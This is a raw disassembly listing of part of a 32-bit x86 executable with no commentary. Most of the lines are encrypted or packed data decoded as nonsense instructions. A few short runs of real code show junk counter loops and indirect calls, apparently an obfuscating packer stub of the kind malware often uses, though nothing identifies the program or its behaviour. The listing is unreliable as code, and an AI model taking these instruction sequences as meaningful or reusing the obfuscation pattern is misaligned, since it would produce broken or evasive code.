  414059:	mov    dl,0xa3
  41405b:	nop
  41405c:	pushw  ss
  41405e:	lods   eax,DWORD PTR ds:[esi]
  41405f:	js     0x414034
  414061:	out    0xf9,eax
  414063:	iret   
  414064:	aam    0x3e
  414066:	stos   BYTE PTR es:[edi],al
  414067:	arpl   WORD PTR [edi],si
  414069:	cmp    al,0x1a
  41406b:	pop    eax
  41406c:	xor    al,0xd4
  41406e:	mov    eax,ds:0x94d12835
  414073:	(bad)  
  414074:	not    bh
  414076:	cld    
  414077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414078:	aad    0x4e
  41407a:	in     al,dx
  41407b:	js     0x41404e
  41407d:	push   ss
  41407e:	dec    esi
  41407f:	sbb    DWORD PTR [edx+0x6c],esi
  414082:	stos   BYTE PTR es:[edi],al
  414083:	xchg   esp,eax
  414084:	fcom   DWORD PTR [ecx]
  414086:	in     eax,dx
  414087:	outs   dx,BYTE PTR ds:[esi]
  414088:	mov    ds:0x8c108d2b,eax
  41408d:	add    BYTE PTR [ebp-0x7cf6873d],dh
  414093:	jmp    0xccfe:0xbca1d0e7
  41409a:	lea    esi,[ebx-0x1174a660]
  4140a0:	pushf  
  4140a1:	xor    BYTE PTR [edi-0x2d],dl
  4140a4:	jae    0x414071
  4140a6:	(bad)  
  4140a7:	mov    al,ds:0xdc7a36b2
  4140ac:	jns    0x4140ba
  4140ae:	sub    cl,BYTE PTR [ecx+0x16]
  4140b1:	ins    DWORD PTR es:[edi],dx
  4140b2:	mov    eax,ds:0xfa3c9b62
  4140b7:	mov    ah,BYTE PTR [esi+0x5cc8b6db]
  4140bd:	fld    DWORD PTR [edi]
  4140bf:	ficom  WORD PTR [ebx-0x1a]
  4140c2:	or     DWORD PTR [edx-0x30],edi
  4140c5:	test   al,0x9b
  4140c7:	sub    ch,bh
  4140c9:	jl     0x414142
  4140cb:	(bad)  
  4140cc:	adc    cl,BYTE PTR [eax+0x22]
  4140cf:	(bad)  
  4140d0:	xchg   ebx,eax
  4140d1:	or     eax,0x979e6059
  4140d6:	(bad)  
  4140d7:	cmp    ebx,eax
  4140d9:	int3   
  4140da:	or     eax,0xdd78b595
  4140df:	push   ds
  4140e0:	xchg   ebx,eax
  4140e1:	sbb    ebx,esi
  4140e3:	lahf   
  4140e4:	xchg   ecx,eax
  4140e5:	push   ebx
  4140e6:	test   DWORD PTR [eax-0x4b471d39],ebx
  4140ec:	loopne 0x414124
  4140ee:	adc    DWORD PTR es:[edx-0x76a12a77],0xe2e52f61
  4140f9:	push   esi
  4140fa:	mov    eax,0xe6a8ce04
  4140ff:	data16 loope 0x41417f
  414102:	faddp  st(2),st
  414104:	mov    dl,BYTE PTR [ebx]
  414106:	call   DWORD PTR [ecx+0x26]
  414109:	jmp    0x89af650f
  41410e:	jg     0x1e638fab
  414114:	imul   BYTE PTR [ebp-0xf]
  414117:	or     eax,0xa186b892
  41411c:	xor    ebx,ebx
  41411e:	vpmacssdql ymm0,ymm5,ymm0,ymm7
  414124:	dec    edx
  414125:	mov    ecx,DWORD PTR [esi+eiz*2+0x718237b]
  41412c:	push   ds
  41412d:	xor    bh,dl
  41412f:	test   BYTE PTR [edi+0x6c939447],cl
  414135:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414136:	rcl    DWORD PTR [ecx-0x11bf4f8f],1
  41413c:	cmp    edx,DWORD PTR [ecx-0x2b]
  41413f:	aad    0x9c
  414141:	arpl   WORD PTR [edi+0x521d7a2d],di
  414147:	daa    
  414148:	iret   
  414149:	shr    DWORD PTR [eax-0x10],0x8b
  41414d:	popf   
  41414e:	mov    eax,0x2cf53f9c
  414153:	xor    edx,DWORD PTR [ebx+0x2]
  414156:	int    0x31
  414158:	outs   dx,BYTE PTR ds:[esi]
  414159:	dec    eax
  41415a:	dec    ebp
  41415b:	jbe    0x414156
  41415d:	iret   
  41415e:	mov    eax,DWORD PTR [ebp-0x14]
  414161:	and    DWORD PTR ds:0x42fd55,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fd55
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fd55,ecx
  414178:	cmp    DWORD PTR ds:0x42fd55,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e5ef
  41418b:	cmp    DWORD PTR ds:0x42fd55,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fd59,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e77f
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fd69
  4141ba:	sbb    DWORD PTR ds:0x42fd55,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd85,0x42e793
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e76b,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd85,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e78f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fd5d,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fd5d
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fd5d,ecx
  41420f:	cmp    DWORD PTR ds:0x42fd5d,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e5f3
  41423b:	cmp    DWORD PTR ds:0x42fd5d,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fd5d
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fd5d,ecx
  414257:	cmp    DWORD PTR ds:0x42fd5d,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x41421e
  414283:	xor    DWORD PTR [ecx-0x5f],ecx
  414286:	xor    BYTE PTR [ebx+0x70],0x70
  41428a:	mov    ecx,0xe270707e
  41428f:	mov    al,ds:0xa7f283f5
  414294:	jp     0x41428c
  414296:	inc    edx
  414297:	sub    al,0x97
  414299:	repnz imul esi,DWORD PTR [edx-0x1a],0x7e
  41429e:	dec    edx
  41429f:	dec    eax
  4142a0:	dec    eax
  4142a1:	pop    ecx
  4142a2:	pusha  
  4142a3:	mov    bh,0x2a
  4142a5:	div    DWORD PTR [edx]
  4142a7:	fst    DWORD PTR [edx-0x15]
  4142aa:	mov    dl,0x5e
  4142ac:	mov    al,ds:0xe985cb16
  4142b1:	or     dh,cl
  4142b3:	mov    ebp,0xbd026cea
  4142b8:	shl    BYTE PTR [ecx+edi*2-0x1e],1
  4142bc:	push   ebx
  4142bd:	mov    ah,0x73
  4142bf:	iret   
  4142c0:	ss sbb al,0x9e
  4142c3:	pop    ds
  4142c4:	adc    ebx,eax
  4142c6:	into   
  4142c7:	ret    0x6150
  4142ca:	push   ss
  4142cb:	sbb    eax,0x85cd97b6
  4142d0:	cdq    
  4142d1:	adc    al,0xe5
  4142d3:	retf   0x383a
  4142d6:	shr    BYTE PTR [ebx],0xa7
  4142d9:	jae    0x414312
  4142db:	mov    ds:0xd6f3dab0,eax
  4142e0:	mov    ecx,0xc8416b3
  4142e5:	out    0x4f,eax
  4142e7:	lea    esp,[eax-0x2c]
  4142ea:	mov    bh,BYTE PTR [ebx]
  4142ec:	sub    DWORD PTR [edx+ebp*4-0x45],edx
  4142f0:	in     al,dx
  4142f1:	pop    edx
  4142f2:	dec    esi
  4142f3:	jbe    0x4142e9
  4142f5:	loop   0x41427d
  4142f7:	sbb    cl,BYTE PTR [eax*4-0x35d10610]
  4142fe:	push   ecx
  4142ff:	pusha  
  414300:	jg     0x4142ad
  414302:	int    0x9c
  414304:	pop    ebx
  414305:	adc    eax,0x56ffce32
  41430a:	mov    al,BYTE PTR [esi+0x314d8b4b]
  414310:	icebp  
  414311:	fadd   st,st(0)
  414313:	nop
  414314:	pop    edx
  414315:	or     eax,0xe76dcfc3
  41431a:	mov    ebx,0xce38dac1
  41431f:	or     DWORD PTR [esi],0xea1c3d40
  414325:	mov    al,ds:0x95c7e705
  41432a:	add    al,0x23
  41432c:	xor    DWORD PTR [edx-0x27143fc0],edx
  414332:	jo     0x414325
  414334:	jae    0x41435f
  414336:	out    dx,al
  414337:	xor    eax,0x3d860b89
  41433c:	sub    al,0xce
  41433e:	pop    eax
  41433f:	(bad)  
  414340:	jp     0x41439d
  414342:	inc    ecx
  414343:	inc    esi
  414344:	sub    BYTE PTR [eax+eax*8-0x54],dl
  414348:	sti    
  414349:	es mov ah,0x7
  41434c:	lods   al,BYTE PTR ds:[esi]
  41434d:	mov    DWORD PTR [ecx],edx
  41434f:	cmp    eax,0x24c631b3
  414354:	js     0x41438b
  414356:	and    al,0x51
  414358:	loopne 0x414344
  41435a:	xchg   DWORD PTR [esi+0x48],edx
  41435d:	lods   eax,DWORD PTR ds:[esi]
  41435e:	push   esi
  41435f:	xor    ecx,edi
  414361:	(bad)  
  414362:	inc    dx
  414364:	adc    dh,BYTE PTR [ecx-0x30]
  414367:	mov    edx,0xd55ea250
  41436c:	push   esp
  41436d:	push   eax
  41436e:	or     DWORD PTR [eax-0x27],0x3d09582d
  414375:	mov    esp,0x44576369
  41437a:	in     eax,0x8f
  41437c:	mov    ah,0x6e
  41437e:	or     eax,DWORD PTR gs:[edi+0x6f416130]
  414385:	or     DWORD PTR [eax-0x7538609f],0xc9cb53
  41438f:	xchg   esp,eax
  414390:	cmp    BYTE PTR [ebp-0x3d8d411e],ah
  414396:	outs   dx,BYTE PTR ds:[esi]
  414397:	shl    dh,0xee
  41439a:	inc    esp
  41439b:	les    esi,FWORD PTR [eiz*4+0x6bbe73c6]
  4143a2:	outs   dx,DWORD PTR ds:[esi]
  4143a3:	imul   eax,DWORD PTR [edi-0x3b78e7bc],0x5a
  4143aa:	jp     0x4143de
  4143ac:	push   ebp
  4143ad:	push   ds
  4143ae:	scas   eax,DWORD PTR es:[edi]
  4143af:	shl    ebx,cl
  4143b1:	add    DWORD PTR [ecx+0xb],esp
  4143b4:	or     edx,DWORD PTR [ebp+0x68ee20ad]
  4143ba:	mov    ebp,0x4e54616e
  4143bf:	dec    ebx
  4143c0:	test   ch,dh
  4143c2:	or     al,0xe3
  4143c4:	daa    
  4143c5:	addr16 pop esi
  4143c7:	outs   dx,DWORD PTR ds:[esi]
  4143c8:	ror    BYTE PTR [ebx],0x8a
  4143cb:	dec    esp
  4143cc:	adc    ch,bl
  4143ce:	mov    ds:0x46dd06cc,eax
  4143d3:	sub    BYTE PTR gs:[edi-0x740b17bb],dl
  4143da:	call   0x4cc0:0x4e36bfda
  4143e1:	add    dl,BYTE PTR [edx+ebx*8-0x346c4e0b]
  4143e8:	mov    WORD PTR [ebp+ecx*2-0x56],ds
  4143ec:	ss push cs
  4143ee:	sbb    edi,DWORD PTR [ecx+ebx*4-0x64]
  4143f2:	fwait
  4143f3:	or     edx,DWORD PTR [edx+0x47]
  4143f6:	fs cdq 
  4143f8:	pop    ebp
  4143f9:	mov    edx,0x48739ba5
  4143fe:	push   edi
  4143ff:	dec    BYTE PTR ds:0xd3c6c9db
  414405:	pop    ebp
  414406:	xor    bh,BYTE PTR [eax-0x14f25e9d]
  41440c:	mul    DWORD PTR ds:0x2165c999
  414412:	sub    dl,BYTE PTR ds:0x214e5260
  414418:	xor    ebx,ebp
  41441a:	jle    0x414479
  41441c:	mov    ch,0x21
  41441e:	fst    QWORD PTR [eax-0x27a5fe4f]
  414424:	clc    
  414425:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414426:	test   ah,0x22
  414429:	lock and dh,BYTE PTR [edx]
  41442c:	addr16 ror bh,0x61
  414430:	cli    
  414431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414432:	pushf  
  414433:	mov    cl,0x36
  414435:	fcom   st(4)
  414437:	sbb    BYTE PTR [ecx],dh
  414439:	mov    edx,0x4b7012eb
  41443e:	sub    edi,ebp
  414440:	adc    dh,BYTE PTR [eax+0x5]
  414443:	inc    eax
  414444:	sub    al,bl
  414446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414447:	js     0x414407
  414449:	inc    ebp
  41444a:	push   0x73
  41444c:	dec    BYTE PTR [ecx]
  41444e:	pop    eax
  41444f:	jbe    0x4143f1
  414451:	ss inc ecx
  414453:	and    DWORD PTR ds:0x8c6ee8f5,ebx
  414459:	cmp    edx,edx
  41445b:	cwde   
  41445c:	or     ebx,DWORD PTR [edx]
  41445e:	add    bl,ah
  414460:	pop    edx
  414461:	pushf  
  414462:	es loop 0x414479
  414465:	stos   BYTE PTR es:[edi],al
  414466:	das    
  414467:	sbb    eax,ecx
  414469:	lods   al,BYTE PTR ds:[esi]
  41446a:	fisttp QWORD PTR [edx]
  41446c:	dec    ecx
  41446d:	ds mov cx,0xcae4
  414472:	shl    BYTE PTR [ebp+0x77],1
  414475:	ins    DWORD PTR es:[edi],dx
  414476:	mov    BYTE PTR [eax-0x56],ch
  414479:	mov    dl,0xc2
  41447b:	xor    ah,bl
  41447d:	adc    DWORD PTR [ebx-0x9694763],ecx
  414483:	mov    esi,0x819b19a9
  414488:	pop    edi
  414489:	mov    DWORD PTR [eax-0x70bc10cf],0xbd765009
  414493:	jo     0x4144f4
  414495:	add    ebp,ecx
  414497:	xchg   esp,eax
  414498:	jae    0x4144cd
  41449a:	arpl   WORD PTR [esi+0xcbb6ea0],ax
  4144a0:	xchg   edi,eax
  4144a1:	pop    edx
  4144a2:	add    BYTE PTR [ecx-0x60],0xed
  4144a6:	fnstcw WORD PTR [edx-0x44cde8e5]
  4144ac:	mov    ebp,0xaa43d703
  4144b1:	xor    esp,DWORD PTR [ecx]
  4144b3:	lahf   
  4144b4:	idiv   BYTE PTR [ecx+ebp*4-0x7f]
  4144b8:	mov    ebx,DWORD PTR [ebp-0x2eb92a50]
  4144be:	loop   0x414533
  4144c0:	loop   0x414516
  4144c2:	lahf   
  4144c3:	sub    al,0x88
  4144c5:	push   0xffffffa4
  4144c7:	outs   dx,DWORD PTR ds:[esi]
  4144c8:	or     dh,BYTE PTR [esi+0x79d1890d]
  4144ce:	mov    edx,0x9974c2db
  4144d3:	mov    ds:0xd410dbb7,eax
  4144d8:	nop
  4144d9:	in     eax,dx
  4144da:	mov    ah,0x7
  4144dc:	loop   0x4144c2
  4144de:	ins    BYTE PTR es:[edi],dx
  4144df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144e0:	(bad)  
  4144e1:	sub    al,0x4e
  4144e3:	loop   0x4144fd
  4144e5:	add    BYTE PTR [edx+0x20],dl
  4144e8:	dec    esp
  4144e9:	jnp    0x4144a0
  4144eb:	mov    DWORD PTR [edx+0x3a],edi
  4144ee:	ins    DWORD PTR es:[edi],dx
  4144ef:	aas    
  4144f0:	xor    BYTE PTR [edi+0x33b1480f],cl
  4144f6:	mov    ds:0x3967eaa3,eax
  4144fb:	pop    ecx
  4144fc:	sahf   
  4144fd:	fcmovu st,st(0)
  4144ff:	inc    ebx
  414500:	ins    DWORD PTR es:[edi],dx
  414501:	mov    ax,0x7668
  414505:	xchg   edx,eax
  414506:	mov    BYTE PTR [ebp-0x7b],dh
  414509:	xor    eax,0x945b4e26
  41450e:	dec    esi
  41450f:	or     esi,DWORD PTR [esi-0x23]
  414512:	pop    ebx
  414513:	mov    ebp,ebp
  414515:	dec    ebp
  414516:	in     eax,0x8e
  414518:	stos   BYTE PTR es:[edi],al
  414519:	(bad)  
  41451a:	push   edx
  41451b:	pop    ecx
  41451c:	js     0x414516
  41451e:	rcl    BYTE PTR [ecx-0x2746b0e7],1
  414524:	test   BYTE PTR [eax-0x6c],cl
  414527:	ret    
  414528:	loopne 0x414546
  41452a:	lahf   
  41452b:	pop    es
  41452c:	dec    esi
  41452d:	push   0xffffffb0
  41452f:	or     bh,bl
  414531:	or     bh,al
  414533:	inc    ecx
  414534:	repz cmc 
  414536:	jge    0x414504
  414538:	sbb    ebp,DWORD PTR [eax]
  41453a:	mov    cl,0x55
  41453c:	xlat   BYTE PTR ds:[ebx]
  41453d:	ret    0xd1ed
  414540:	cmp    DWORD PTR [eax-0x7],ebp
  414543:	jp     0x41451c
  414545:	pop    ebp
  414546:	fs pop ss
  414548:	daa    
  414549:	mov    ecx,0x75816e3c
  41454e:	in     al,dx
  41454f:	or     al,0x8e
  414551:	dec    ebp
  414552:	(bad)  
  414553:	adc    eax,0xd075ff47
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0x4a78beb4
  414576:	sbb    eax,0x7f70c9b5
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x414578
  414581:	aas    
  414582:	call   0xa410:0x45be109c
  414589:	retf   
  41458a:	in     al,0xa0
  41458c:	jle    0x4145ec
  41458e:	mov    ch,0x92
  414590:	js     0x414604
  414592:	in     al,0xb3
  414594:	sub    DWORD PTR [esi],eax
  414596:	xor    ecx,DWORD PTR [edx-0x5c]
  414599:	and    ebx,DWORD PTR [ebx]
  41459b:	adc    ebp,ebp
  41459d:	out    dx,al
  41459e:	mov    esp,0x13922c0b
  4145a3:	dec    ebp
  4145a4:	imul   esp,ebx,0xf32ebd95
  4145aa:	jecxz  0x4145d3
  4145ac:	cmp    bh,BYTE PTR [edi]
  4145ae:	cwde   
  4145af:	cmp    ch,BYTE PTR [ebx+0x5fb0c25d]
  4145b5:	scas   eax,DWORD PTR es:[edi]
  4145b6:	repnz mov ds:0x533489a,al
  4145bc:	mov    esi,0x154512b
  4145c1:	push   0x200c805a
  4145c6:	call   0x665b43a
  4145cb:	ja     0x414554
  4145cd:	lock scas al,BYTE PTR es:[edi]
  4145cf:	adc    ch,BYTE PTR [ebx]
  4145d1:	scas   eax,DWORD PTR es:[edi]
  4145d2:	pop    ds
  4145d3:	xchg   esi,eax
  4145d4:	fwait
  4145d5:	jo     0x4145e7
  4145d7:	sbb    eax,0x91e1ad7c
  4145dc:	xchg   ebp,eax
  4145dd:	fcom   QWORD PTR ds:0x592fe858
  4145e3:	mov    ds:0x56c64f41,eax
  4145e8:	scas   eax,DWORD PTR es:[edi]
  4145e9:	sar    DWORD PTR ds:0xfbd06cc4,0x14
  4145f0:	out    dx,al
  4145f1:	scas   eax,DWORD PTR es:[edi]
  4145f2:	mov    dh,0xd1
  4145f4:	lea    edi,[edi+0x0]
  4145f7:	dec    ebp
  4145f8:	rcl    DWORD PTR [eax+0x77ba7f6d],cl
  4145fe:	mov    gs,WORD PTR [ebx-0x35]
  414601:	cdq    
  414602:	sar    DWORD PTR [ebx],0x93
  414605:	mov    ah,0xf1
  414607:	cdq    
  414608:	sub    DWORD PTR [ecx+ecx*1],edi
  41460b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41460c:	cmc    
  41460d:	push   ecx
  41460e:	xchg   ebp,eax
  41460f:	push   0x68
  414611:	ins    BYTE PTR es:[edi],dx
  414612:	lds    esi,FWORD PTR [ebp+eiz*1+0x66]
  414616:	pop    ds
  414617:	lea    edi,[eax-0x10]
  41461a:	push   ds
  41461b:	dec    edi
  41461c:	(bad)  
  41461d:	mov    ebp,0x147da36
  414622:	pop    ss
  414623:	lods   eax,DWORD PTR ds:[esi]
  414624:	jbe    0x4145c7
  414626:	stos   BYTE PTR es:[edi],al
  414627:	push   ss
  414628:	test   DWORD PTR [ecx],ecx
  41462a:	aas    
  41462b:	pop    ss
  41462c:	pop    eax
  41462d:	mov    ebp,0xf2f33052
  414632:	(bad)  
  414633:	(bad)
  414636:	daa    
  414637:	imul   edi,DWORD PTR [ebp+0x16],0x5
  41463b:	mov    bl,0x7f
  41463d:	adc    esi,eax
  41463f:	mov    ecx,0x984cd0fe
  414644:	jb     0x4145fd
  414646:	(bad)  
  414647:	xchg   edi,eax
  414648:	loop   0x4145f2
  41464a:	sbb    al,BYTE PTR [esi+0xe58154]
  414650:	xor    al,0xaf
  414652:	ffreep st(0)
  414654:	(bad)  
  414655:	jecxz  0x41467a
  414657:	add    BYTE PTR [ebp-0x16],bl
  41465a:	jne    0x4146a9
  41465c:	mov    ds:0xdadee5b6,al
  414661:	fnstcw WORD PTR [ecx-0xe]
  414664:	lahf   
  414665:	xor    ebp,DWORD PTR [ebp-0x79]
  414668:	adc    ecx,DWORD PTR [esp+esi*8]
  41466b:	pop    ebp
  41466c:	outs   dx,DWORD PTR ds:[esi]
  41466d:	inc    DWORD PTR [eax+eiz*1+0x23]
  414671:	retf   0xaf2
  414674:	mov    esp,0x87dddad6
  414679:	mov    ds:0xe4e8d408,al
  41467e:	iret   
  41467f:	out    0xb6,al
  414681:	sbb    ch,BYTE PTR [esi-0x2]
  414684:	outs   dx,DWORD PTR ds:[esi]
  414685:	inc    ecx
  414686:	retfw  
  414688:	mov    esi,0xba5ed7cf
  41468d:	or     ebp,DWORD PTR [ecx-0x6db4f6d2]
  414693:	lods   al,BYTE PTR ds:[esi]
  414694:	bound  ebp,QWORD PTR [ebp+0x59399719]
  41469a:	jnp    0x414644
  41469c:	ja     0x4146bf
  41469e:	leave  
  41469f:	mov    ah,0x17
  4146a1:	stos   DWORD PTR es:[edi],eax
  4146a2:	repz xchg ebx,eax
  4146a4:	push   0x1e
  4146a6:	pop    esp
  4146a7:	add    BYTE PTR [eax*4-0x31a4d1e9],bh
  4146ae:	add    eax,0x87fc8bc9
  4146b3:	es push edx
  4146b5:	inc    edi
  4146b6:	popa   
  4146b7:	jae    0x4146b2
  4146b9:	loop   0x414692
  4146bb:	inc    ebp
  4146bc:	fld    st(7)
  4146be:	imul   edi,DWORD PTR [ecx+eiz*4+0x2ef4c5],0x51
  4146c6:	pushf  
  4146c7:	icebp  
  4146c8:	shr    DWORD PTR [ebx-0x20b7fba5],0x99
  4146cf:	fimul  DWORD PTR [eax+0xb]
  4146d2:	lods   eax,DWORD PTR ds:[esi]
  4146d3:	iret   
  4146d4:	mov    WORD PTR [ebx+esi*8],?
  4146d7:	outs   dx,DWORD PTR ds:[si]
  4146d9:	pop    ss
  4146da:	sub    al,0x3e
  4146dc:	fbstp  TBYTE PTR [ecx+0x57de075f]
  4146e2:	adc    al,BYTE PTR [ebx+0x7]
  4146e5:	add    dl,BYTE PTR [edx-0x2faf7ac]
  4146eb:	sahf   
  4146ec:	xchg   edi,eax
  4146ed:	outs   dx,DWORD PTR ds:[esi]
  4146ee:	ins    DWORD PTR es:[edi],dx
  4146ef:	or     BYTE PTR [ecx-0x6],0x52
  4146f3:	clc    
  4146f4:	popa   
  4146f5:	mov    esi,0x455ca8b9
  4146fa:	push   ax
  4146fc:	jg     0x4146fe
  4146fe:	mov    esp,0x11a5362f
  414703:	add    DWORD PTR [eax+0x79194811],edi
  414709:	or     bh,0x2e
  41470c:	sbb    BYTE PTR [eax],dh
  41470e:	pushf  
  41470f:	mov    edx,0x93812f95
  414714:	imul   edi,DWORD PTR [edx-0x24ce59db],0xffffffd0
  41471b:	ja     0x4146f1
  41471d:	push   0xda77149d
  414722:	or     bl,cl
  414724:	or     eax,0x6273e6ec
  414729:	inc    ecx
  41472a:	(bad)  
  41472b:	rcr    BYTE PTR [eax+ebx*1-0x5a21744d],1
  414732:	xor    BYTE PTR [eax],0xee
  414735:	cmp    al,0xb5
  414737:	pusha  
  414738:	jae    0x41479d
  41473a:	ret    0x518a
  41473d:	hlt    
  41473e:	mov    ch,0x18
  414740:	ins    BYTE PTR es:[edi],dx
  414741:	pop    ebx
  414742:	mov    bl,0xaa
  414744:	jb     0x414770
  414746:	scas   al,BYTE PTR es:[edi]
  414747:	dec    esi
  414748:	jle    0x4146ed
  41474a:	cmp    bl,cl
  41474c:	xchg   ecx,eax
  41474d:	shl    eax,0x9a
  414750:	aaa    
  414751:	add    BYTE PTR [ecx-0x2e],dl
  414754:	outs   dx,BYTE PTR ds:[esi]
  414755:	jecxz  0x414763
  414757:	mov    ch,0x97
  414759:	in     al,dx
  41475a:	sbb    eax,0xa14e47a2
  41475f:	movaps xmm4,xmm4
  414762:	and    DWORD PTR [ecx+ebp*1],ebx
  414765:	ror    BYTE PTR ds:0xf2d9e632,1
  41476b:	(bad)
  41476e:	inc    edx
  41476f:	sbb    cl,BYTE PTR [eax]
  414771:	jecxz  0x414773
  414773:	cmp    bh,BYTE PTR [esi-0x4f]
  414776:	loop   0x414780
  414778:	xchg   edi,eax
  414779:	in     al,dx
  41477a:	stc    
  41477b:	add    eax,0x4ac24b09
  414780:	dec    ebx
  414781:	mov    esp,DWORD PTR [ecx+0x91f98da]
  414787:	mov    ah,0xde
  414789:	(bad)  
  41478a:	jmp    0x4c163f81
  41478f:	mov    esp,0x4279cd04
  414794:	or     edi,DWORD PTR [edi+esi*8+0x1e]
  414798:	fwait
  414799:	add    ah,dl
  41479b:	not    dh
  41479d:	inc    edi
  41479e:	add    edx,eax
  4147a0:	sub    BYTE PTR [eax-0x4],ch
  4147a3:	push   0x3e
  4147a5:	sbb    DWORD PTR [ecx-0x18],0xd86b0cb6
  4147ac:	or     BYTE PTR [edi+0x69],al
  4147af:	in     al,dx
  4147b0:	mov    bh,al
  4147b2:	sbb    ecx,edi
  4147b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147b5:	rcr    BYTE PTR [esi+ecx*1-0x4ee73cd],0xb8
  4147bd:	sti    
  4147be:	adc    bl,BYTE PTR [edi-0x79582c80]
  4147c4:	mov    DWORD PTR [ebx+0x1e],esi
  4147c7:	push   cs
  4147c8:	test   al,0xec
  4147ca:	mov    bh,cl
  4147cc:	jbe    0x414838
  4147ce:	and    DWORD PTR [eax-0x32],edi
  4147d1:	dec    edx
  4147d2:	xlat   BYTE PTR ds:[ebx]
  4147d3:	push   ecx
  4147d4:	cmp    DWORD PTR [edi+0x38010230],0xffffffd6
  4147db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147dc:	and    al,0x7b
  4147de:	scas   al,BYTE PTR es:[edi]
  4147df:	xor    al,0xdc
  4147e1:	jl     0x41483a
  4147e3:	pop    edi
  4147e4:	fwait
  4147e5:	loop   0x414831
  4147e7:	xchg   edx,eax
  4147e8:	fwait
  4147e9:	jns    0x414779
  4147eb:	test   eax,0x80ed3e15
  4147f0:	xchg   edx,eax
  4147f1:	mov    bh,ah
  4147f3:	inc    eax
  4147f4:	cmp    ah,BYTE PTR [ecx+eiz*2]
  4147f7:	mov    bh,0xfd
  4147f9:	shr    BYTE PTR [ebx],1
  4147fb:	xor    DWORD PTR [edi+0x7126e2ec],0xffffffd7
  414802:	sbb    al,cl
  414804:	repnz daa 
  414806:	add    eax,0x3a1c5805
  41480b:	nop
  41480c:	outs   dx,DWORD PTR ds:[esi]
  41480d:	les    edi,FWORD PTR [ebp+0x791e2fe2]
  414813:	(bad)
  414816:	ficomp DWORD PTR ds:0x18eb2f6b
  41481c:	add    DWORD PTR [edi],edi
  41481e:	mov    DWORD PTR [ecx+0x73732a22],edi
  414824:	popf   
  414825:	dec    esi
  414826:	pop    edi
  414827:	sbb    ebx,DWORD PTR [ecx+0x4422e3bd]
  41482d:	and    DWORD PTR [ecx+ebx*1+0x41],0x57
  414832:	sbb    DWORD PTR ds:0x9eac7659,edx
  414838:	outs   dx,BYTE PTR ds:[esi]
  414839:	mov    edx,DWORD PTR [ebx-0x51c26815]
  41483f:	mov    ah,0x8a
  414841:	mov    esi,DWORD PTR [eax-0xc]
  414844:	xor    esi,DWORD PTR [edi-0x7f]
  414847:	mov    ecx,DWORD PTR [ebp-0x8]
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x414835
  414861:	repnz mov edi,0x7f7d12a7
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x4148d9
  41486d:	ins    BYTE PTR es:[edi],dx
  41486e:	mov    dh,0xc8
  414870:	sbb    eax,0xffcbe2ae
  414875:	jno    0x414814
  414877:	mov    ch,ah
  414879:	test   eax,0x9fdcc02e
  41487e:	es gs pop ss
  414881:	and    ebp,0xffffff9a
  414884:	push   ss
  414885:	rcr    DWORD PTR [ebx-0x6f63887a],cl
